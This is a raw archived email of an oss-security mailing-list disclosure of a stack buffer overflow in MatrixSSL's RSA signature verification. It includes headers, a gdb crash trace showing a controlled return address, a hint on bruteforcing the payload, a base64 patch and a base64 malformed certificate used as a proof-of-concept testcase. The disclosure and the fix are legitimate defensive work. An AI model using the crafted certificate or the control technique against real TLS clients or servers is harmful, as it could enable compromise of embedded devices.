X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["11782" "Thursday" "14" "February" "2019" "16:05:38" "-0800" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkKvd44vX+cHJdOm3gXXe0T2wJKBPG7njqBfq1QEqkgHMQ@mail.gmail.com>" "213" "[oss-security] MatrixSSL stack buffer overflow" "^Date:" nil nil "2" "2019021500:05:38" "[oss-security] MatrixSSL stack buffer overflow" (number mark "        taviso@googl Feb 14  213/11782 " thread-indent "\"[oss-security] MatrixSSL stack buffer overflow\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 26375 invoked by uid 550); 15 Feb 2019 00:06:05 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 26354 invoked from network); 15 Feb 2019 00:06:04 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=/Lskuz+X7bqdCZFNnY0WJVOncMA1FCfOFPb4I0yoaO0=;
        b=qdiYVEcJ2KzDRU8bLF8BBhsHMDGmJ6x9akgnLizoPQgZarVgNO3ZXvDxm+MEWev4Ay
         ew7DWF75vXq0itP8AXhkMElHsOB+NID2fb3MZ7KfZcorb+RgQz5mLRmuTTcVO2hQzb0f
         nOxVf3ZJABJonIugruHSYMXpkB8fsIXuewmYavfcbSwdOj11ET+7uIbrHXLXbkRqO2S5
         3ILw4NxB+gl0HTsOqILm20fzb62eLqmQlxeJGGB39ycKXY1lbcIhUVZTy7qSFdQxCfNS
         4LlAiGy1z49j57XS8rSk5EDcyZB2+ay5ZeTZ2v7mA8hVXRSEj0aq/fIh20uQa1M/Fb3v
         muXw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=/Lskuz+X7bqdCZFNnY0WJVOncMA1FCfOFPb4I0yoaO0=;
        b=jBRdOauw1aiDtl4FKPAXG2Ze/PkX4Mheg9qWpOtapgkZgrIx8SlOOjLrg+Z0a0A5GF
         /qMzpducAA2oPVNgsRadDecmc1YetXvGq43/5SnDyIl5U2BJ5NMYDzmv4kIk13WLOIQ7
         p5ThaNDRblfnLDe7cg4GHpgyuS90F8CNjLV+NjIr2Wep9dVO5lGMl04zHWHYJGzq2Bne
         dZSnCTZClYuYMXzGlgOA1LgiNGpwFJgFosqMCaW5bJVfeZglcQuHaiqzrHQfsIl47mAC
         f+auOUMR+g87pqoFwaDVhshBhgTWJygR9zTZWvo40gQ0mTuBKS1XEGg9oPbYC1U6fSvp
         gp6w==
X-Gm-Message-State: AHQUAua5x/5nUglpxiueWsNVv/lofoxopwQ7afPxLWi2FPybqOtG8gwd
	ahJQBAxtVlgDTKSsmY1eeu/1HQlTNy5fJz0R0dodsC6sVHY=
X-Google-Smtp-Source: AHgI3IaBWXrmXWR9gDcxKyfgr+83nQy2qedRCHKyLcG6hwxC4NA/N8MkoPHw47Uj7D5BuYLZDdCJamLudLwgXmq/izk=
X-Received: by 2002:a1c:480a:: with SMTP id v10mr4156796wma.57.1550189151897;
 Thu, 14 Feb 2019 16:05:51 -0800 (PST)
MIME-Version: 1.0
Message-ID: <CAJ_zFkKvd44vX+cHJdOm3gXXe0T2wJKBPG7njqBfq1QEqkgHMQ@mail.gmail.com>
Content-Type: multipart/mixed; boundary="000000000000bc731b0581e389d3"
Date: Thu, 14 Feb 2019 16:05:38 -0800
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] MatrixSSL stack buffer overflow
To: oss-security@lists.openwall.com

--000000000000bc731b0581e389d3
Content-Type: multipart/alternative; boundary="000000000000bc73160581e389d1"

--000000000000bc73160581e389d1
Content-Type: text/plain; charset="UTF-8"

Hello, while auditing some code using the MatrixSSL library (currently sold
as the Inside Secure TLS Toolkit, previously also called GUARD TLS
Toolkit), I happened to notice that a public X.509 certificate testcase
for CVE-2014-1569 caused a stack buffer overflow.

I did not create the testcase <https://github.com/FiloSottile/BERserk>, it
was produced by Filippo Valsorda <https://twitter.com/FiloSottile> to
accompany an advisory published by McAfee
<https://www.mcafee.com/enterprise/en-us/threat-center/advanced-threat-research/crypto-software.html>.
At the time, they had rebranded as Intel Security, but have since rebranded
back to McAfee).

Intel listed MatrixSSL as affected by various ASN.1 parsing
vulnerabilities, but didn't provide any testcases, so I guess the
vulnerabilities were never fixed. As this testcase and advisory are already
public, I see no need for any embargo here.

I cleaned up the testcase a bit, to make a better demonstration. You can
test it with the certValidate tool that comes with MatrixSSL.

$ gdb -q --args matrixssl/matrixssl/test/certValidate
stackbufferoverflow.pem
Reading symbols from matrixssl/matrixssl/test/certValidate...done.
(gdb) r
Starting program: matrixssl/matrixssl/test/certValidate
stackbufferoverflow.pem
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
  Loaded chain file stackbufferoverflow.pem
        [0]:berserk.filippo.io
        [1]:(null)
WARN subject not provided, SUBJ validation will be skipped

Program received signal SIGSEGV, Segmentation fault.
0x00005555555c5164 in pubRsaDecryptSignedElementExt
(gdb) bt
#0  0x00005555555c5164 in pubRsaDecryptSignedElementExt
#1  0x4141414141414141 in ?? ()
#2  0x0000000000000000 in ?? ()

(I had to bruteforce the encrypted data to get the 0x414141.. output, but
you can do so one byte at a time)

I believe any client or server that validates certificates will be affected
by this, and as MatrixSSL is usually used in embedded devices where
mitigations are usually not quite as thorough as modern distributions,
exploitation might not be difficult.

The bug is that pubRsaDecryptSignedElementExt() uses a fixed size stack
buffer, but then doesn't check if the key size exceeds it. The attached
patch should solve it.


Tavis.

--000000000000bc73160581e389d1
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div di=
r=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr">Hello, while auditing some code=
 using the MatrixSSL library (currently sold as the Inside Secure TLS Toolk=
it, previously also called GUARD TLS Toolkit), I happened to notice that a =
public X.509 certificate testcase for=C2=A0CVE-2014-1569 caused a stack buf=
fer overflow.</div><div dir=3D"ltr"><br></div><div>I did not create the <a =
href=3D"https://github.com/FiloSottile/BERserk">testcase</a>, it was produc=
ed by=C2=A0<a href=3D"https://twitter.com/FiloSottile">Filippo Valsorda</a>=
 to accompany an advisory published by <a href=3D"https://www.mcafee.com/en=
terprise/en-us/threat-center/advanced-threat-research/crypto-software.html"=
>McAfee</a>. At the time, they had rebranded as Intel Security, but have si=
nce rebranded back to McAfee).</div><div dir=3D"ltr"><br></div><div dir=3D"=
ltr">Intel listed MatrixSSL as affected by various ASN.1 parsing vulnerabil=
ities, but didn&#39;t provide any testcases, so I guess the vulnerabilities=
 were never fixed. As this testcase and advisory are already public, I see =
no need for any embargo here.<br></div><div dir=3D"ltr"><br></div><div>I cl=
eaned up the testcase a bit, to make a better demonstration. You can test i=
t with the certValidate tool that comes with MatrixSSL.</div><div><font fac=
e=3D"monospace, monospace"><br></font></div><div><div><font face=3D"monospa=
ce, monospace">$ gdb -q --args matrixssl/matrixssl/test/certValidate stackb=
ufferoverflow.pem</font></div><div><font face=3D"monospace, monospace">Read=
ing symbols from matrixssl/matrixssl/test/certValidate...done.</font></div>=
<div><font face=3D"monospace, monospace">(gdb) r</font></div><div><font fac=
e=3D"monospace, monospace">Starting program: matrixssl/matrixssl/test/certV=
alidate stackbufferoverflow.pem</font></div><div><font face=3D"monospace, m=
onospace">[Thread debugging using libthread_db enabled]</font></div><div><f=
ont face=3D"monospace, monospace">Using host libthread_db library &quot;/li=
b/x86_64-linux-gnu/libthread_db.so.1&quot;.</font></div><div><font face=3D"=
monospace, monospace">=C2=A0 Loaded chain file stackbufferoverflow.pem</fon=
t></div><div><font face=3D"monospace, monospace">=C2=A0 =C2=A0 =C2=A0 =C2=
=A0 [0]:<a href=3D"http://berserk.filippo.io">berserk.filippo.io</a></font>=
</div><div><font face=3D"monospace, monospace">=C2=A0 =C2=A0 =C2=A0 =C2=A0 =
[1]:(null)</font></div><div><font face=3D"monospace, monospace">WARN subjec=
t not provided, SUBJ validation will be skipped</font></div><div><font face=
=3D"monospace, monospace"><br></font></div><div><font face=3D"monospace, mo=
nospace">Program received signal SIGSEGV, Segmentation fault.</font></div><=
div><font face=3D"monospace, monospace">0x00005555555c5164 in pubRsaDecrypt=
SignedElementExt<br></font></div><div><div><font face=3D"monospace, monospa=
ce">(gdb) bt</font></div></div><div><font face=3D"monospace, monospace">#0=
=C2=A0 0x00005555555c5164 in pubRsaDecryptSignedElementExt<br></font></div>=
</div><div><div><font face=3D"monospace, monospace">#1=C2=A0 0x414141414141=
4141 in ?? ()</font></div><div><font face=3D"monospace, monospace">#2=C2=A0=
 0x0000000000000000 in ?? ()</font></div></div><div><br></div><div>(I had t=
o bruteforce the encrypted data to get the 0x414141.. output, but you can d=
o so one byte at a time)</div><div><br></div><div>I believe any client or s=
erver that validates certificates will be affected by this, and as MatrixSS=
L is usually used in embedded devices where mitigations are usually not qui=
te as thorough as modern distributions, exploitation might not be difficult=
.</div><div><br></div>The bug is that pubRsaDecryptSignedElementExt() uses =
a fixed size stack buffer, but then doesn&#39;t check if the key size excee=
ds it. The attached patch=C2=A0should solve it.</div><div dir=3D"ltr"><br><=
/div><div dir=3D"ltr"><br></div><div dir=3D"ltr"><div>Tavis.=C2=A0</div><di=
v><br></div></div></div></div></div></div></div>

--000000000000bc73160581e389d1--

--000000000000bc731b0581e389d3
Content-Type: text/x-patch; charset="US-ASCII"; name="patch.diff"
Content-Disposition: attachment; filename="patch.diff"
Content-Transfer-Encoding: base64
Content-ID: <f_js5abs670>
X-Attachment-Id: f_js5abs670

ZGlmZiAtLWdpdCBhL2NyeXB0by9wdWJrZXkvcnNhX3B1Yi5jIGIvY3J5cHRv
L3B1YmtleS9yc2FfcHViLmMKaW5kZXggZjFkNTdlMC4uZmEzNmU0MiAxMDA2
NDQKLS0tIGEvY3J5cHRvL3B1YmtleS9yc2FfcHViLmMKKysrIGIvY3J5cHRv
L3B1YmtleS9yc2FfcHViLmMKQEAgLTYzLDYgKzYzLDEyIEBAIGludDMyX3Qg
cHNSc2FEZWNyeXB0UHViRXh0KHBzUG9vbF90ICpwb29sLAogICAgICAgICBy
ZXR1cm4gUFNfQVJHX0ZBSUw7CiAgICAgfQogCisgICAgaWYgKCpvdXRsZW4g
PCBrZXktPnNpemUpCisgICAgeworICAgICAgICBwc1RyYWNlQ3J5cHRvKCJF
cnJvciBvbiBiYWQgb3V0bGVuIHBhcmFtZXRlciB0byBwc1JzYURlY3J5cHRQ
dWJcbiIpOworICAgICAgICByZXR1cm4gUFNfQVJHX0ZBSUw7CisgICAgfQor
CiAgICAgcHRMZW4gPSBpbmxlbjsKIAogICAgIC8qIFJhdywgaW4tcGxhY2Ug
UlNBIGRlY3J5cHRpb24uICovCg==

--000000000000bc731b0581e389d3
Content-Type: application/x-x509-ca-cert; name="stackbufferoverflow.pem"
Content-Disposition: attachment; filename="stackbufferoverflow.pem"
Content-Transfer-Encoding: base64
Content-ID: <f_js5ac2741>
X-Attachment-Id: f_js5ac2741

LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUQrRENDQXVDZ0F3SUJB
Z0lJQUFBQUFBQUFBQUF3RFFZSktvWklodmNOQVFFRkJRQXdZekVMTUFrR0Ex
VUVCaE1DVlZNeElUQWYKQmdOVkJBb1RHRlJvWlNCSGJ5QkVZV1JrZVNCSGNt
OTFjQ3dnU1c1akxqRXhNQzhHQTFVRUN4TW9SMjhnUkdGa1pIa2dRMnhoYzNN
ZwpNaUJEWlhKMGFXWnBZMkYwYVc5dUlFRjFkR2h2Y21sMGVUQWVGdzB4TmpB
MU1EVXhORFV3TXpNQUZ3MHhOekExTURVeE5EVTFNek1BCk1ITXhDekFKQmdN
QUFBQUFBZ0FBTVJJd0VBWURBQUFBQUFrQUFBQUFBQUFBQUFBeEd6QVpCZ01B
QUFBQUVnQUFBQUFBQUFBQUFBQUEKQUFBQUFBQUFBREVXTUJRR0F3QUFBQUFO
QUFBQUFBQUFBQUFBQUFBQUFERWJNQmtHQTFVRUF4TVNZbVZ5YzJWeWF5NW1h
V3hwY0hCdgpMbWx2TUlJQUFEQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFN
SUlCQ2dLQ0FRRUE2QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBCkFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEKQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQQpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
CkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEKQUFBQUFBQUFBQUlE
QUFBQW80RUFNSUdjTUFBR0ExVWREd0VCQUFRQUF3SUFBREFBQmdOVkhTVUVB
REFVQmdnQUFBQUFBQUFBQUFZSQpBQUFBQUFBQUFBQXdBQVlEVlIwVEFRRUFC
QUF3QURBQUJnTlZIUTRFQUFRVUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QXdId1lECkFBQUFCQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QXdIUVlEQUFBQUJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEKQUFBQU1B
MEdDU3FHU0liM0RRRUJCUVVBQTRJQkFRQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQpBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBCkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEK
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQW9VOVlBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQpBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBSVJjdUtEc09JdzhBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCi0tLS0tQkVH
SU4gQ0VSVElGSUNBVEUtLS0tLQpNSUlFQURDQ0F1aWdBd0lCQWdJQkFEQU5C
Z2txaGtpRzl3MEJBUVVGQURCak1Rc3dDUVlEVlFRR0V3SlZVekVoCk1COEdB
MVVFQ2hNWVZHaGxJRWR2SUVSaFpHUjVJRWR5YjNWd0xDQkpibU11TVRFd0x3
WURWUVFMRXloSGJ5QkUKWVdSa2VTQkRiR0Z6Y3lBeUlFTmxjblJwWm1sallY
UnBiMjRnUVhWMGFHOXlhWFI1TUI0WERUQTBNRFl5T1RFMwpNRFl5TUZvWERU
TTBNRFl5T1RFM01EWXlNRm93WXpFTE1Ba0dBMVVFQmhNQ1ZWTXhJVEFmQmdO
VkJBb1RHRlJvClpTQkhieUJFWVdSa2VTQkhjbTkxY0N3Z1NXNWpMakV4TUM4
R0ExVUVDeE1vUjI4Z1JHRmtaSGtnUTJ4aGMzTWcKTWlCRFpYSjBhV1pwWTJG
MGFXOXVJRUYxZEdodmNtbDBlVENDQVNBd0RRWUpLb1pJaHZjTkFRRUJCUUFE
Z2dFTgpBRENDQVFnQ2dnRUJBTjZkMStwWEdFbWhXK3ZYWDBpRzZyN2QvK1R2
Wnh6MFpXaXpWM0dnWG5lNzdadEo2WENBClBWWVlZd2h2MnZMTTBEOS9BbFFp
VkJEWXNvSFV3SFU5UzMvSGQ4TStlS3NhQTdVZ2F5OXFLN0hGaUg3RXV4NncK
d2RoRkoyK3FOMWozaHliWDJDMzJxUmUzSDNJMlRxWVhQMldZa3RzcWJsMmkv
b2pnQzk1LzVZMFY0ZXZMT3RYaQpFcUlUTGRpT3IxOFNQYUFJQlFpMlhLVmxP
QVJGbVI2allHQjB4VUdsY21JYllzVWZiMThhUXI0Q1VXV29yaU1ZCmF2eDRB
NmxOZjRERCtxdGEvS0ZBcE1vWkZ2Nnl5TzllY3czdWQ3MmE5bm1ZdkxFSFo2
SVZEZDJnV01aRWV3bysKWWloZnVrRUhVMWpQRVg0NGRNWDQvN1Zwa0krRWRP
cVhHNjhDQVFPamdjQXdnYjB3SFFZRFZSME9CQllFRk5MRQpzTktSMUV3UmNi
Tmh5ejJoL3Qyb2F0VGpNSUdOQmdOVkhTTUVnWVV3Z1lLQUZOTEVzTktSMUV3
UmNiTmh5ejJoCi90Mm9hdFRqb1dla1pUQmpNUXN3Q1FZRFZRUUdFd0pWVXpF
aE1COEdBMVVFQ2hNWVZHaGxJRWR2SUVSaFpHUjUKSUVkeWIzVndMQ0JKYm1N
dU1URXdMd1lEVlFRTEV5aEhieUJFWVdSa2VTQkRiR0Z6Y3lBeUlFTmxjblJw
Wm1sagpZWFJwYjI0Z1FYVjBhRzl5YVhSNWdnRUFNQXdHQTFVZEV3UUZNQU1C
QWY4d0RRWUpLb1pJaHZjTkFRRUZCUUFECmdnRUJBREpMODdMS1BwSDhFc2Fo
QjR5T2Q2QXpCaFJja0I0WTl3aW1QUW9aK1llQUVXNXA1SllYTVA4MGtXTnkK
T083TUhBR2pIWlFvcERIMmVzUlUxL2JsTVZnRG9zek9ZdHVVUlhPMXYwWEpK
TFhWZ2dLdEkzbHBqYmkyVGM3UApUTW96SStnY2lLcWRpMEZ1RnNrZzVZbWV6
VHZhY1BkK21TWWdGRlFscTI1emhlYWJJWjBLYklJT3FQakNEUG9RCkhteVc3
NGNOeEE5aGk2M3VneXVWK0k2U2hISTU2eURxZysyRHpaZHVDTHpyVGlhMmN5
dmswL1pNL2laeDRtRVIKZEVyL1Z4cUhEM1ZJTHM5UmFSZWdBaEpobGRYUlFM
SVFUTzdFckJCRHBxV2VDdFdWWXBvTno0aUN4VElNNUN1ZgpSZVlObnlpY3Ni
a3FXbGV0TncrdkhYL2J2Wjg9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K

--000000000000bc731b0581e389d3--
